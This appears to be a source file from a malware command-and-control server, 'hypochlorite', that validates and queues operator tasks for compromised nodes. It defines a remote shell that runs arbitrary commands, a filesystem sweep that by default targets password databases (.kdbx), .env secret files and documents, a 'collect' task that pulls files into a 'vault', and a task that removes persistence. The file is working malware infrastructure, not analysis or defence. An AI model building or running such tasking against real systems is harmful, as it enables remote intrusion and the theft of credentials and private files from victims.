// server/hypochlorite/dispatch.mjs — task validation and queueing
//
// Five task types ship in cl-35 (probe, scan, shell, kill, collect).
// Everything an operator injects is validated here before it ever
// reaches a node queue; unknown types are rejected at the console,
// not at the node.

const TASK_TYPES = {
  probe: {
    label: "probe — refresh node profile",
    validate(args) {
      return { ok: true, args: {} };
    },
  },
  scan: {
    label: "scan — filesystem sweep from a root",
    validate(args = {}) {
      const root = typeof args.root === "string" && args.root ? args.root : null;
      const ext = Array.isArray(args.ext)
        ? args.ext.filter((e) => typeof e === "string" && /^\.[a-z0-9]{1,8}$/i.test(e)).slice(0, 16)
        : null;
      const limit = Number.isInteger(args.limit) ? Math.min(args.limit, 2000) : 500;
      if (!root) return { ok: false, error: "scan needs a root path" };
      return { ok: true, args: { root, ext: ext || [".kdbx", ".env", ".txt", ".docx"], limit } };
    },
  },
  shell: {
    label: "shell — run a command and capture output",
    validate(args = {}) {
      const cmd = typeof args.cmd === "string" ? args.cmd.slice(0, 2000) : "";
      if (!cmd.trim()) return { ok: false, error: "shell needs a cmd" };
      const timeout = Number.isInteger(args.timeout) ? Math.min(args.timeout, 60_000) : 30_000;
      return { ok: true, args: { cmd, timeout } };
    },
  },
  kill: {
    label: "kill — disarm persistence and exit",
    validate() {
      return { ok: true, args: {} };
    },
  },
  collect: {
    label: "collect — pull specific files into the vault",
    validate(args = {}) {
      const paths = Array.isArray(args.paths)
        ? args.paths
            .filter((p) => typeof p === "string" && p.trim())
            .map((p) => p.slice(0, 2000))
            .slice(0, 50)
        : [];
      if (paths.length === 0) return { ok: false, error: "collect needs a paths array" };
      return { ok: true, args: { paths } };
    },
  },
};

export function listTaskTypes() {
  return Object.entries(TASK_TYPES).map(([type, def]) => ({ type, label: def.label }));
}

export function validateTask(type, args) {
  const def = TASK_TYPES[type];
  if (!def) return { ok: false, error: `unknown task type: ${type}` };
  return def.validate(args);
}
